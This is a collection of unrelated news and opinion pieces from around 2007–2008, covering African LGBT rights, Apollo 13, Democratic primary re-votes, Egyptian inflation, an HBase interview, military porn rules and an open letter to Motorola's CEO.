" I 'm finding myself as an individual who is every day trying to get the people that I identify with ... everyday having to educate them about who I am , but finding it difficult for them to open their minds and their hearts , " she told the BBC .
" I have n't found myself being attacked or kicked out of home but it 's just the discourse , how people talk about lesbian issues or how our government ... how they tend to sideline people like myself . "
Mugabe attack
Many traditional African societies view same - sex relationships as abhorrent and activists accuse some African governments of state - sponsored discrimination and persecution .
In Zimbabwe , President Robert Mugabe , has attacked homosexuality as a Western import - describing gays as " worse than dogs and pigs " .
In Senegal , the recent publication of photos from a gay wedding provoked violent demonstrations .
In contrast , South Africa holds the most liberal attitude towards homosexuality on the continent .
The South African constitution bans discrimination based on sexual orientation and the government legalised same - sex marriages in 2006 .
But even here , activists say , openly gay and lesbian people have been threatened , detained and arrested .
The obsessive - compulsive and oral - fixation types will love this one .
Japanese company Miharu has come up with an oral camera that you can plug into a TV to monitor your molars on a regular basis .
You might say that this creation is not necessary .
I say that it is only progress in the battle against cavities and the impending growth of a social life .
The device plugs into your TV and the video endoscope tip illuminates with the touch of a button ( the better to use your other hand to pick at whatever you ’re looking at ) .
The package includes 25 disposable plastic covers , in case you want to lend it out to your friends , and it ’s operated with AAA batteries .
The pinhole through which the camera sees is .02 ” , allowing for a good detailed area .
Click on after the jump to see another image of this strange gadget .
For me , the one thing that seems inappropriate about it is that it ’s becoming popular for use on other “ parts of the body such as the back , skin , head , etc for easy and sanitary viewing . ”
Oh really ?
I think that if people are compelled to use this device consistently , they should invest in buying more than one and making sure they specifically label each one .
You do n’t want to get mixed up .
Because that would be unsanitary .
Crewmen aboard the USS Iwo Jima hoist the Apollo 13 Command Module aboard ship after successful splashdown in the Pacific .
Tragedy had been narrowly averted .
Courtesy NASA __1970 : __Apollo 13 splashes down in the Pacific Ocean near Samoa , recovering from a barely survivable explosion in space .
Apollo 13 launched from Cape Canaveral on April 11 , intended to be the third manned lunar landing .
The crew — James A. Lovell Jr. , John L. Swigert Jr. and Fred W. Haise Jr. — experienced a slight vibration shortly after launch , but things were going normally until 55 hours , 55 minutes into the flight .
Oxygen tank No. 2 exploded , causing No. 1 to fail and start leaking rapidly .
Warning lights started blinking .
The astronaut 's supplies of air , water , light and electricity were imperiled ... 200,000 miles from Earth .
Swigert radioed Mission Control in Texas : " Houston , we 've had a problem here . "
The 1995 hit film Apollo 13 used a more dramatic version : " Houston , we have a problem . "
NASA had engineered some redundancy into the Apollo systems , but it was an extremely close scrape .
The plan now was to scrap the lunar landing , swing around the moon and return home .
The crew clambered from the Command Module into the attached Lunar Module as a lifeboat .
__Oxygen : __There was plenty in the LM , because more oxygen was available from the tanks that would have supplied liftoff from the moon 's surface .
__Light and electricity : __All noncritical systems were turned off , reducing power consumption to one - fifth of normal .
But without the heat generated by those systems , the temperature inside the capsule dropped to 38 degrees Fahrenheit .
LM power was used to recharge batteries in the CM for eventual re-entry in the Earth 's atmosphere .
__Water : __LM systems needed water for cooling .
So the crew conserved water by drinking little and eating only wet foods .
They became severely dehydrated , losing about 10 pounds each .
But the water lasted .
__Carbon dioxide removal : __The LM had lithium hydroxide canisters to remove the CO2 for two men for two days , not three men for four days .
Under the guidance of Mission Control , the astronauts attached the CM canisters to the LM system with a pipeline made of plastic bags , cardboard and tape , all of which NASA had placed on board .
Kluge city .
__Getting home : __The navigation system was transfered from CM to LM , but the alignment needed to be checked .
Debris from the explosion made it hard for the astronauts to fix upon any distant stars .
So NASA instructed the crew to use the nearest one : the sun .
Precise navigation was essential , because returning to the Earth at too steep an angle would cause the CM to burn up in the atmosphere .
Too tangential an angle could skip the module out into space forever .
Fire or ice .
After four days of alternating terror and hope , the three astronauts climbed back to the CM for re-entry an hour before splashdown .
Everything worked out .
The Apollo 13 Accident Review Board later determined the cause of the explosion .
Improvements to the command module in 1965 raised the permissible voltage to the oxygen - tank heaters from 28 to 65 volts DC .
But the heater switches were n't likewise upgraded .
The final launch - pad test ran the heaters hot and long .
Wires near the heaters were cooked at 1,000 degrees Fahrenheit — enough , it was learned later , to " severely degrade teflon insulation .
The thermostatic switches started to open ... and were probably welded shut . "
NASA also found that other warning signs had been ignored , and the oxygen tank was a potential bomb that became a real bomb .

Michigan do - over primary likely to happen on June 3 RAW STORY

At least one of the two states whose votes were n't counted for the 2008 Democratic presidential race because they violated party rules by holding early primaries may be getting a second chance .
" Key Michigan Democrats were negotiating feverishly toward breaking the impasse with the national Democratic Party over the state 's 156 national convention delegates , " Mark Hornbeck and Deb Price report for The Detroit News .
" The most promising compromise on the table was a June 3 do - over primary . "
Greg Sargent , reporting for Talking Point Memo's Election Central , spoke to the Obama campaign 's Michigan co-chair who said that there was " momentum " gathering for a re-vote .
" There 's a lot of momentum behind the redo option , " State Senator Tupac Hunter , told Sargent , adding that it's " taking up the lion 's share of the discussions . "
The Detroit News article continues , " A blue - ribbon group of four top Michigan Democrats formed to seek a resolution met in Washington on Thursday with top officials in Hillary Rodham Clinton 's campaign and by conference call , separately , with Barack Obama 's camp .
They are looking for a compromise acceptable to the state party , the Democratic National Committee and both presidential campaigns . "
Michigan Democrats need to act quickly because the politically divided legislature will have to sign off on the deal and approve how to spend the privately raised funds for a new election .
Members of the Democratic - controlled state House and Republican - controlled state Senate leave at the end of the month on their two - week spring break .
The contest must be held by June 10 for the results to count under DNC rules .
Michigan currently has an election set for May 6 for voters to decide on education issues .
The date of that contest could be changed to accommodate a new presidential primary .
The Clinton campaign made it clear that it strongly prefers a state - run primary to mail - in voting during the meeting , according to a campaign official speaking anonymously about the private talks .
People involved in the private meeting said the Clinton advisers favor the state - run primary because there would be less likelihood of problems such as fraud and ballot counting than with a mail - in vote .
The national party punished Michigan and Florida for moving up their primaries before Feb. 5 , stripping them of all their delegates .
The two states have been struggling to come up with alternative plans to ensure their delegates are seated at the national convention this summer in Denver .
Michigan held its primary Jan. 15 and Florida voted Jan. 29 .
Clinton won both , although she was the only major candidate on the Michigan ballot .
On Thursday , Florida Democrats proposed a vote - by - mail presidential primary while acknowledging the plan 's chances are slim .
Karen Thurman , chairwoman of the Florida Democratic Party , offered a mail - in / in person proposal for voting and urged state leaders , the national party and the presidential candidates to sign on .
Under the plan , all of Florida 's 4.1 million Democrats would be mailed a ballot .
They could send it back , or cast a ballot in one of 50 regional voting centers that would be set up .
The election would end June 3 , a week before a Democratic National Committee deadline to name delegates .
The estimated cost is $ 10 million to $ 12 million .
Asked if the plan will be implemented , Thurman said , " I have a feeling that this is probably closer to not , than yes . "
Members of Florida 's congressional delegation reiterated their opposition to the plan , saying , " We do not believe that this is a realistic option at this time and remain opposed to a mail - in ballot election or any new primary election in Florida of any kind . "
Florida Rep. Robert Wexler , an Obama backer , said supporters of both candidates and those in the delegation who are uncommitted are working on an alternative to get the delegates seated .
He said an option would be to find middle ground in the number of delegates that Obama and Clinton get .
Clinton has said the delegates should be awarded according to the results of Florida 's Jan. 29 election , which she won .
Some Obama supporters have suggested splitting the delegates evenly since the candidates agreed not to campaign in the state since it violated party rules by going too early .
" There 's a high demand by one candidate and a low demand by the other , and somewhere in between is a resolution , " Wexler said .
" So that 's what we 're trying to figure out . "
Sen. Bill Nelson , Florida 's senior Democrat and a Clinton backer , said one option that ought to be considered would be to award delegates based on the January vote , but have them count for half the delegates of other states .
However , Obama 's campaign said they will not support any plan that allocates delegates based on the January vote .
Nelson said he discussed the issue with Obama and Clinton on the Senate floor Thursday .
" I 've been saying , ` You guys have got to get this thing resolved . '
And they both have said to me that they intend to get the Michigan and Florida delegation seated at the convention , " he said .
" But the devil 's in the details . "
Thurman will review comments from Democratic leaders and make a decision by Monday on whether to continue with the re-vote .
But she acknowledged that Obama has had concerns and the Democratic National Committee wo n't support a proposal unless both candidates also back it .
She said there 's a serious question over whether the state could legally verify the signatures of a privately run election .
" If this becomes something that we can't do , then we can't do it , " Thurman said .
Florida 's secretary of state 's office said it could not assist with verifying the signatures on the ballot .
Republican Gov. Charlie Crist , however , has said he is n't opposed to the state helping verify signatures as long as no taxpayer money is spent and state and national parties have n't already worked out another solution .
Obama told reporters traveling on his campaign plane Thursday that although he has concerns about mail - in voting , " we 're going to abide by whatever the DNC decides . "
" We 're not gonna make the final decision on it , and I 'll abide by whatever rules the DNC lays out , " he said .
Four Michigan Democratic leaders uncommitted to either candidate discussed options for a do - over Thursday with both the Clinton and Obama campaign leaders .
Democratic National Committee member Debbie Dingell , Rep. Carolyn Cheeks Kilpatrick , Sen. Carl Levin and United Auto Workers President Ron Gettelfinger are in that group trying to develop a new plan with input from both sides .

Social unrest has been growing on the back of rising inflation , which is undermining consumers ' purchasing power and fuelling general dissatisfaction with the fallout of economic reform .
This has led to a rising number of demonstrations .
These include further protests against rising prices by thousands of textile workers at Mahalla al - Kubra ( who are generally credited with having started the current wave of labour protests in late 2006 ) .
Groups such as doctors , nurses and university professors have also threatened to strike , a rare phenomenon in Egypt .
Thin rations
The government has sought to address the discontent in several ways .
It is especially attempting to improve subsidy provision , separating the production and sale of subsidised bread — the main element in the Egyptian diet — in order to reduce corruption .
Families were allowed to add children to their ration cards in February for the first time since 1988 ( increasing the total number of beneficiaries from 40 m to an estimated 55 m ) .
Nevertheless , as rising wheat prices force more and more people to rely on subsidised bread , the queues are lengthening and supplies are coming under strain .
Similar problems have also arisen regarding diesel fuel , which is used to power machinery and farm equipment .
Shortages have led to outbreaks of fights at petrol stations , and accusations that the government is deliberately keeping stocks hidden to boost prices .
Consumer price inflation rose again in February , to 12.1 % year on year , up from 10.5 % in January .
The month - on - month increase was 1.8 % in February , compared with 4 % in January .
Food prices , which account for 40 % of the basket of goods used to calculate consumer price inflation , rose by 16.8 % year on year in February , similar to the 16.2 % year - on - year increase recorded in January .
In addition to soaring food prices , building materials , especially steel and cement , have also seen sharp price increases , driven by buoyant domestic demand which is further boosting inflationary pressures .
The price of rebars produced by Al - Ezz Steel , which commands a 65 % share of the domestic steel market , rose by E£ 370 / tonne ( US$ 67 ) at the beginning of March , pushing up the wholesale price to E£ 4,580 / tonne and the consumer price to E£ 5,000 / tonne .
This was the fourth increase so far this year , which the company blames on global factors boosting input costs .
Cement prices also rose in mid-March , to E£ 450/t , from E£ 440 / t the previous week .
Fertiliser prices , which are government controlled , have also risen sharply , by around 90 % to E£ 1,500 / tonne at the beginning of March in an effort to equalise global and domestic prices ( though this still leaves a 40 % discount on world market prices ) .
Subsidising prices has led to distortions in the local market , creating insufficient supplies at the low , official prices and a growing parallel economy .
At the same time , international commodity prices , especially for wheat and food oils , have increased strongly , by nearly 70 % during 2007 .
This has forced the government to increase domestic wheat prices , from E£ 220 per bushel to E£ 320 per bushel — the price paid by the government to farmers for the 2008 crop , in the hope that more wheat will be made available for the domestic market .
Egypt is the world 's largest wheat importer , importing around 6 m tonnes / year , about half the country 's needs .
Rising food prices led the government to increase subsidies by E£ 4.7bn in the fourth quarter of 2007 , taking total subsidies for fiscal 2007 / 08 to E£ 14.4bn .
Minimum wage
To alleviate pressure , the government is considering raising the minimum wage from the current level of £ E35 / month ( US$ 6 ) .
A meeting in mid-February of the Higher Council for Wages ( which includes representatives of government , unions and business ) recommended a rise to £ E250 / month , with an annual review .
However , unions are demanding at least £ E600 to ensure minimum living standards , and protestors have called for a minimum wage of as much as £ E1,200 / month .
Even in the event of the government agreeing to a higher minimum wage , given the size of Egypt 's informal economy , such an increase is unlikely to provide much assistance to the very poor .
Google 's recent introduction of their Google Application Engine and its inclusion of access to BigTable has created renewed interest in alternative database technologies .
A few weeks back InfoQ interviewed Doug Judd a founder of the Hypertable project which is inspired by Google 's BigTable database .
This week InfoQ has the pleasure of presenting an interview with HBase leads im Kellerman , Michael Stack , and Bryan Duxbury .
HBase is is an open - source , distributed , column - oriented store also modeled after BigTable .
1 . How would you describe HBase to someone first hearing about it ?
HBase is an open - source , distributed , column - oriented store modeled after the Google paper , " Bigtable : A Distributed Storage System for Structured Data " by Chang et al .
Just as Bigtable leverages the distributed data storage provided by the Google File System , HBase provides Bigtable - like capabilities on top of Hadoop .
HBase is a subproject of Hadoop with its home at Apache .
The HBase project is for those whose yearly Oracle license fees approach the GNP of a small country or whose MySQL install is starting to buckle because tables have a few BLOB columns and the row count is heading north of a couple of million rows .
Any one who has mountains of structured or semi-structured data and who is currently up against the limits with their RDBMS should come take a look at HBase .
Better , consider weighing in on the the project .
We 're not about to hit our humble goal -- Very Large Tables of versioned cells , billions of rows * millions of columns hosted atop clusters of ' commodity ' servers -- any time soon without the backing of a broad group of users , supporters , and contributors .
2 . Why did the team start the project ?
Powerset , where Jim and Stack work , needed a Bigtable - like data store to hold its webtable , a wide table of web documents and their attributes keyed by URL .
Rapleaf , Bryan 's employer , joined in on the project when it became apparent that they would need a Bigtable - like storage system to host a large table of profiles , as well as a host of other types of data .
3 . How does it compare to Hypertable ?
Clearly both projects set out to solve generally the same problem - open - source Bigtable .
Hypertable is C++ while HBase is Java .
HBase has a head - start in terms of how long we 've been in open development , as well as the number of committers and outside contributions .
The choice of Java allows us to integrate more tightly with Hadoop than Hypertable can - when we use HDFS , we do n't need another process started to act as broker between the Java and C++ worlds nor do we have to cross the JNI " great divide " .
Also , because we use Java , we had a leg - up because a good part of our core types and functionality had already been written and debugged by an active community of " Smart Folks " over on the Hadoop Core project .
The Hypertable project has a singular focus on " performance " and feels strongly that only C++ can deliver in this regard .
Interestingly , as we understand it , most of the Hadoop development is being done by a team at Yahoo that used to work in C++ and that reportedly balked at a Java MapReduce framework for many of the same reasons cited by Hypertable .
It appears the Hadoop team have gotten over that particular concern ; where Java suffers performance or otherwise , they make the appropriate redress and move on .
For example , Hadoop / HBase use native libraries for compression because here Java performs poorly .
HBase needs to do a bunch of work around performance for sure -- the above cited core types and the RPC transport need to be recast to better suit HBase use patterns -- but currently our focus is elsewhere .
We 're trying to follow the path taken by the Hadoop project concentrating on robustness , scaling , correctness , and community - building first .
Later , we 'll get to speeding it all up .
When the time comes , we 'll be sure to post the invites far and wide to the Hypertable vs. HBase Drag Race Smackdown .
Sporting rivalry aside , the Hypertable fellas are our compañeros .
We talk on a fairly regular basis and in general are about helping each other out .
4 . What are your thoughts on Google App Engine Exposing BigTable ?
It 's very interesting to see Google following Amazon 's lead in this regard , especially because Google 's systems are the " reference " implementations of all the concepts both Hadoop and Amazon are working on .
However , as a lot of people have noted since the announcement of App Engine , there 's a big difference between owning your infrastructure and renting it .
It 's probably a very good thing for you when you are small , but as soon as you reach a surprisingly low threshold , you 're better off hosting it yourself .
Likewise , there 's the problem of lock - in : try moving your app out of App Engine once it actually does get popular , even if it makes economic sense to have your own hardware .
You wo n't have all the software pieces that your system was built on .
In a lot of ways , it seems like a step backwards from the advantages of LAMP .
That said , an implementation of the Google App Engine DataStore API that went against HBase and that parsed GQL , etc. , is a contribution we would n't say no to .
5 . The M/R paradigm applies well to batch processing of data .
How does Hadoop apply in a more transaction / single request based paradigm ?
MapReduce ( both Google 's and Hadoop 's ) is ideal for processing huge amounts of data with sizes that would not fit in a traditional database .
Neither is appropriate for transaction / single request processing .
While HBase uses HDFS from Hadoop Core , it does n't use MapReduce in its common operations .
However , HBase does support efficient random accesses , so it can be used for some of the transactional elements of your business .
You will take a raw performance hit over something like MySQL , but you get the benefit of very good scaling characteristics as your transactional throughput grows .
But you can eat your cake too in that HBase has gotten some nice contributions from the folks at IBM Research that makes it easy to use HBase as a MapReduce source and destination , so your HBase based - data can participate in MapReduce batch processing operations also .
6 . What has been the best thing you 've found working with Hadoop ?
Being a Hadoop subproject is like being hooked to a twin turbo .
The biggest boost comes from having ready access to the Hadoop core developers .
Also , being part of the Hadoop community has attracted users to HBase .
We get to take advantage of a huge amount of work that 's already been done in Hadoop - many bits of HBase are reused from Hadoop .
We 've also been exposed to input and review from the Hadoop community at large , which is an enormous benefit .
The second boost comes from our being part of Apache .
The Apache meritocracy has a bunch of already - developed processes and infrastructure that we can exploit and that we do n't have to develop ourselves .
7 . The worst ?
We only see upside ( Smile ) .
If we must say something ....
In a lot of ways , Hadoop 's development of HDFS and MapReduce have been one and the same , so sometimes it's hard to get the core developers to understand the differences in our uses of HDFS ; for example , MapReduce does n't normally do random reads as HBase must .
And there is the lack of an append operation in HDFS ( See HADOOP - 1700 ) .
Without it , HBase can lose data on server crash .
Its looking like we will get this feature in Hadoop 0.18.0 .
8 . What companies are using HBase ?
Powerset and Rapleaf are at the forefront .
Companies we know that are actively using HBase loaded with sizeable datasets include WorldLingo and Wikia .
Many others are taking their first steps into using HBase .
If any one else is interested in using HBase , let us know !
9 . What does the future hold for HBase ?
In the near future , we 're about stabilizing our 0.1 branch .
We 'll release 0.1.2 in the next week or so .
We see a stable offering as a key means of developing a user base and a set of contributors .
Otherwise , in our next significant release in May , 0.2 , you 'll see big improvements in robustness , a bunch of better cluster self - management features like region rebalancing , and an improved client API .
Larry Davis , who gained notoriety after wounding six New York police officers in a 1986 shootout , prompting a huge manhunt , has been stabbed to death in prison , according to US officials .
Davis was fatally wounded yesterday at about 7.30 pm local time during a recreation break at Shawangunk jail , 80 miles north of New York City , according to a spokesman for the New York state prisons department .
Davis , 41 , was stabbed repeatedly with a home - made metal blade in the arms , head , back , upper thigh and chest .
Another inmate was being questioned over the killing , said spokesman Erik Kriss .
Davis had been serving 25 years to life for murder in a case unrelated to the police shootout .
The 1986 gun battle began after police had gone to an apartment to arrest Davis over the killing of five drug dealers .
Davis escaped unhurt through a window , setting off a 17 - day manhunt involving hundreds of officers .
He was eventually tracked to a housing project where one of his sisters lived .
At Davis 's trial , his defence team accused police officers of trying to kill him because he had knowledge of police corruption , and said he had acted in self - defence .
A jury acquitted him of attempted murder and aggravated assault but he was convicted on weapons charges .
The gunfight and Davis 's flight from the law made him a folk hero to some , and a symbol of outrage to others , especially police officers .
The Larry Davis Story , a documentary directed by Troy Reed , alleges that New York police were involved in narcotics trading in the 1980s , and claims that the shootout came after Davis backed out of a drug deal .
ABC News :
Where are war architects now , four years after ' Mission Accomplished ? '
David Edwards and Mike Sheehan
Published : Tuesday May 1 , 2007 Print This Email This
Today marks four years since President Bush announced " Mission Accomplished " on an aircraft carrier , proclaiming an end to major combat operations in Iraq .
Yet the war continues and " the majority of Americans say we are on the wrong path , " as ABC 's Diane Sawyer remarks on Good Morning America .
" How naive that [ ' Mission Accomplished ' ] banner looks four years later , " adds ABC News senior national correspondent Claire Shipman , " and that is being charitable . "
She continues , " It is striking when you look at it , how circumstances have changed for all of the president 's men behind the war effort " as she recalls the moment aboard the carrier as a " moment of Bushian bravado that this administration will never live down . "
Four years later , Shipman describes the mission as " a disaster , and the once indestructible architects in profound disarray " as she recounts events surrounding such former Bush administration officials as Paul Wolfowitz , George Tenet , Karl Rove and Vice President Dick Cheney .

I didnt ask to become a military porn fugitive .
And yes , maybe I 've watched " Blowjob Impossible " a few too many times to be truly objective .
A while back , my longtime friend Tara ( not her real name ) was dating a guy who was set for his second deployment to Iraq .
She was getting ready to go visit him at a base before he left ; he was in charge of a group that was about to see some very heavy duty action .
Before she left , she asked if I had any porn she could smuggle onto the base for the guys .
She told me ,  They really need it , and it would make them so happy . "
Eager to support our troops , I happily obliged .
I hit up all my local connections at porn stores and gathered a pile of donation magazines ; the kind with real porn in them , like Leg Show , Black Tail , Juggs and Taboo .
I met her at Muddy Waters on Valencia Street to make the exchange ; she was late as shed been caught up on BART trains delayed , ironically , by an anti-war protest taking place downtown .
I asked her if that was weird , and she replied smiling ,  No !
I might protest a bit myself before heading home . "
I knew Tara wasnt kidding .
She followed up with me a few weeks later , telling me how much the guys appreciated the porn  they whooped and cheered as it was distributed , and were even more exuberant when they found out it was handpicked by a girl .
I had no idea Id participated in the breaking of any laws .
But I had .
And Id do it again in a red - hot , Barely Legal second .
Porn -- the oft - ridiculous caricature of human sexuality , and most basic sex toy that there is -- is considered by officials as dangerous to our service people as drugs .
The Military Honor and Decency Act of 1996 prohibits stores on military bases from selling " sexually explicit material . "
It defines that as film or printed matter " the dominant theme of which depicts or describes nudity " or sexual activities " in a lascivious way . "
Challenged as a First Amendment violation , the law was upheld by a U.S. appeals court in 2002 .
In Iraq , service people are subject toGeneral Order Number 1a ( GO - 1a ) put into effect December 19 , 2000 : The regulations prohibit conduct prejudicial to the maintenance of good order and discipline of all forces .
"
GO - 1a prohibits a lot of things , such as " controlled substances and drug paraphernalia " , gambling , selling or defacing artifacts and national treasures , entry into a Mosque without permission and much more .
Including porn .
GO - 1a expressly prohibits our soldiers from -- or " protects " them from , " Introduction , possession , transfer , sale , creation or display of any pornographic or sexually explicitphotograph , video tapes , movie , drawing , book , magazine , or similar representations . "
Sure -- go sweat your life into your fatigues guarding a checkpoint that might deliver you a suicide bomber , but get caught with a DVD of " Shaving Ryan 's Privates " and you 're in trouble .
And not the kind that involves shaving anyone 's privates , not for fun anyway .
The laws are nearly ten years old , so what 's the fuss , Miss Evil Porn Crusader ?
Well , according to USA Today , the US Military is currently " under fire " for not banning every conceivable kind of porn out there .
According to the piece ,
 Dozens of religious and anti-pornography groups have complained to Congress and Defense Secretary Robert Gates that a Pentagon board set up to review magazines and films is allowing sales of material that Congress intended to ban .
" They 're saying ' we 're not selling stuff that 's sexually explicit ' and we say it 's pornography , " says Donald Wildmon , head of the American Family Association , a Christian anti-pornography group .
A letter - writing campaign launched Friday by opponents of the policy aims to convince Congress to " get the Pentagon to obey the law , " he adds . "
What , exactly , are their anti-porn panties in a collective bunch about if hardcore porn is already banned ?
Specifically , " Playboy " , " Penthouse " and all kinds of other " all - American " adult entertainment .
The sponsor of 1996's Decency ActRep . Roscoe Bartlett , R - Mdadds cryptically in the USA Today piece " the military is skirting Congress ' intent " and notes " the material also could contribute to a hostile environment for female military personnel . "
I wonder , what exactly is he suggesting about our servicemen ?
I 'll agree that porn can most certainly be used to create a hostile environment for all genders and orientations , but that 's a matter of soldiers ' ( and officers ' ) conduct ; not the porn itself .
Porn can't " make " anyone do anything they did n't already want to , and people who rape  and act abusively  will do so , no matter the catalyst or tools they use .
" Saturday Night Beaver " is not a gateway drug , nor is it bad for morale .
Connecting with explicit human sexuality , as lame ( or as delicious ) as porn can be , is what keeps us from being machines , killing , defending , or otherwise .
Not to mention that enjoying it should be one of the rights they 're dying for .
And do these guys think that our servicewomen dont want porn ?
It 's a pretty entertaining notion to think that our servicemen might be at risk for a hostile environment if military women could only get their hands on a DVD copy of " Rambone " .
It 's interesting to note that the loudest protests againstGO - 1a have come from The Humane Society and other animal companion organizations .
GO - 1a(.pdf via militarymascots.org ) also prohibits soldiers from keeping animals .
In fact , in 2005 soldiers confirmed that the US government hired contractors to shoot dogs and cats to carry out this grim set of " good order and discipline " laws .
And I 'll make the same argument for porn that the Humane Society has made for allowing soldiers to have companions , " But Americans , be they in Baghdad , Beaufort , Billings , or Boston , all know the same truth .
The bond between humans and animals does not compromise character or morale .
It enhances them . "
So while the bond between a serviceperson and Summer Cummings ' massive mammaries -- orRocco Siffredi 's lethal weapon -- may be fleeting , it 's no less valid for morale .
Soldiers need to take care of themselves , and wanking is an important part of that .
The Pentagon may have stood by Playboy this round , but they dumped 67 % of the titles available to service people .
I dont think it 's a question of " why does the Pentagon hate the military " but instead , why do conservative groups get to ban our soldiers from the little taste of stateside sex they can get their hands on ?
True , I may have seen " Top Buns " too many times .
But I know this : masturbation to porn is a healthy form of self - pleasure .
And denying it is not .
Our soldiers are risking everything for a variety of very confusing and conflicting values .
Not everyone is going to agree with their urge to fap to " Clear and Present Dildo " , but as Americans , is nt it their right ?

Harris Poll asked TV viewers , both Democrat and Republican , to name their favorite and least liked news personalities .
The results of the survey , crunched and displayed on our chart , are fascinating .
1. Katie Couric , at the extreme left of our chart , is so heavily disliked by Republican viewers that the new CBS anchor might as well be a communist .
2 . By calculating the balance of Democratic and Republican opinion , we arrayed the anchors across the political spectrum : nearly two - thirds of the anchors slant left , at least in respondents minds ; but the right - wing anchors of Fox News are the most polarizing .
3. Viewers are surprisingly indifferent to Lou Dobbs : I would have thought the CNN anchor 's anti-immigration stance would have won him more conservative fans .
4. Disliked by all political tribes : CNN 's diaper - wearing Larry King ; oh - so- serious Wolf Blitzer ; Fox 's token liberal , Alan Colmes ; CNN 's graceless Nancy Grace and Scientologist Greta Van Susteren .
5 . All things to all people : ABC nightly news anchor Charlie Gibson ; NBC's Brian Williams ; and , surprisingly , CNN 's silver fox , Anderson Cooper .
( Better not let the social conservatives know that he likes Latin men ! )
Click on the image to enlarge .
Methodology : Harris asked respondents for the three most liked and disliked TV personalities ; we took the net totals for survey participants who also gave a political affiliation .
For instance , 42 % of Republicans liked Bill O'Reilly , and 10 % disliked him , giving him a net approval rating among Republicans of 32 % , indicated by the substantial red bar under his name .
Only 11 % of Democrats said they liked the controversial Fox News anchor , and 34 % named him one of their least favorite news figures , giving him a net approval rating among Democrats of negative 23 % , marked by the blue bar stretching below the x-axis .

South Africa , the official birthplace of Apartheid was the scene of a massive anti apartheid rally .
ISRAELI APARTHEID !
The keynote speaker was our very own exiled member of the Israeli Knesset , Azmi Bishara .
Similar rallies were held in major cities throughout the world , including New York where this photo was taken … a photo of Bishara addressing the audience by video .

Apartheid will not go away on its own , it is a cancer that must be treated and fought like any other disease of its kind … .
JOIN THE FIGHT !!!!
APARTHEID IN ISRAEL CAN BE BEATEN !
The following is a brief report on the meeting held in Soweto … .
Stop the Wall and International – Israeli Apartheid Week 2008 was officially launched on Sunday , 3 February in Soweto , South Africa .
Exiled Palestinian member of the Israeli Knesset , Azmi Bishara , addressed his lecture on the 60th anniversary of the Palestinian Nakba , when hundreds of thousands of Palestinians were displaced from their land to become what remains one of the world ’s largest refugee populations .
Bishara spoke under the banner ‘ Silenced in Apartheid Israel – Welcomed in Soweto ’ alongside prominent South Africans such as Eddie Maque , General Secretary of the South African Council of Churches .
Geoffrey Frost was Motorola 's Chief Marketing Officer , and the RAZR was his baby .
Last month , we got a letter from his former personal adviser , Numair Faraz , written to current Motorola CEO Greg Brown about how a cabal of inept , out - of - touch executives more worried about their golf score than the company drove once mighty Moto into the ground .
It got lost in our bloated inbox , but with Moto splitting up today , Engadget reminded us we had it .
For anyone wondering what the hell happened to Moto , with its endless string of RAZR knockoffs and crappy handsets , it 's a must - read :
I 've always considered it Motorola 's dirty little secret that the strategy for their entire profit machine was run by the company 's CMO — not the rest of the company 's executives , who are as inept now as they have ever been .
Many close to Geoffrey believed Ed Zander worked him to death , putting the pressure of the fate of the company in his hands .
That 's just a touch .

Subject : Open letter to Greg Brown
Hi Nick ,
Was wondering if you could have your guys publish this on Gizmodo .
Would really appreciate it , and I am sure it would get a couple hits .

Dear Greg ,
After making repeated attempts to contact you via your office , I am forced to write this open letter to publicly air my grievances concerning Motorola .
As you may or may not recall , I was the young person who worked with Geoffrey Frost during his days as CMO of the company .
I was the one quoted in Forbes in 2003 as saying " Motorola 's biggest problem is that Samsung kicks ass , " and helped Geoffrey in his efforts to revamp the company 's mobile lineup — an effort that eventually lead to the creation of the RAZR .
As I told the company 's senior designers at Motorola 's 75th anniversary meeting : create something cooler and more expensive than anything else out there , and everyone will want it .
After the success of the RAZR , I implored the company to beef up their software expertise , and focus on creating socially networked devices ( this , in the era before MySpace and Facebook became the juggernauts they are today ) .
Your predecessor , Ed Zander , had little interest in this , and instead proceeded to prop up Motorola 's stock price by parlaying his friendship with Steve Jobs into the ill - fated ROKR effort .
Zander , who seemed to care more about his golf score than running one of America 's greatest corporations , left all of the hard work to Geoffrey ; I 've always considered it Motorola 's dirty little secret that their entire profit machine and strategy was run by their CMO — not the rest of the company 's executives , who are as inept as they have ever been .
Many believe Ed Zander worked Geoffrey to death , putting the pressure of the fate of the company in his hands .
I took his untimely death in 2005 very badly , and knew that the company would head downhill in the aftermath .
Ed Zander continued to reap the dividends of Geoffrey 's work , and the company made billions in profit from overselling the RAZR .
Instead of channelling that money into the obvious — you know , further development of consumer devices —
Zander purchased enterprise companies such as Symbol , and engineered massive stock repurchases .
As I told Zander in a phone call in 2007 , I felt that he was setting the company up for massive failure .
He had the audacity to say " well , maybe Geoffrey should have come up with a better successor to the RAZR , " and told me to " wait for big things in 2008 . "
I guess he was right — he got a big golden parachute , and exited out of the company .
Your appointment to the position of chief executive gave me cause for hope , and I reached out to you ; I knew you were one of the main drivers behind the enterprise acquisitions , and that you had zero expertise in consumer devices .
Surely you could use some help in turning that business around ?
It really angers me to see that you 're really no different from the rest of the incompetent senior executives at Motorola — but instead of merely being incompetent , you killing the company .
Your lack of understanding of the consumer business does n't give you a valid reason for selling the business ; moreover , publicly disclosing your explorations of such a move , in an attempt to keep Carl Icahn off your back , shows how much you value the safety of your incompetence .
You have no interest in fighting the good fight and attempting to mould Motorola into the market leader it can and should be ; taking control of the handset division , as you have recently done , will accomplish very little — it will simply give you an ability to say " we tried our best " when you finally cart the business off to the highest bidder .
In order to turn the handset division around , you need to bring in another Geoffrey ; someone worldly and dynamic who is more interested in success than their corporate career .
You need to task the company 's designers with the same mantra that created the RAZR — make me a phone that looks , feels , and works like a symbol of wealth and privilege .
Recognize the superiority of American software , and bring back those jobs so irresponsibly outsourced to China and Russia .
Fully embrace embedded Linux and Google 's Android initiative , and take the phone operating system out of the stone age .
Recognize that , while rich people do n't really know what they want , the lower end of the market does — and fund the development of an online " crowdsourced " device design platform to take advantage of this fact .
Get rid of all of your silly , useless marketing , including those overpriced and completely ineffective celebrity endorsements , and do one solidified global campaign with Daft Punk ( the only group whose global appeal extends from American hip hoppers to trendy Shanghai club kids to middle - aged Londoners ) .
Understand that the next big feature in handsets is n't a camera or a music player — it is social connectedness ; build expertise in this area , and sell it down the entire value chain .
I 've been there when Motorola 's handset division was brought back from the brink of death 5 years ago ; follow my advice , and we can do it again .
Maybe it sounds like I take the downfall of Motorola personally ; I do .
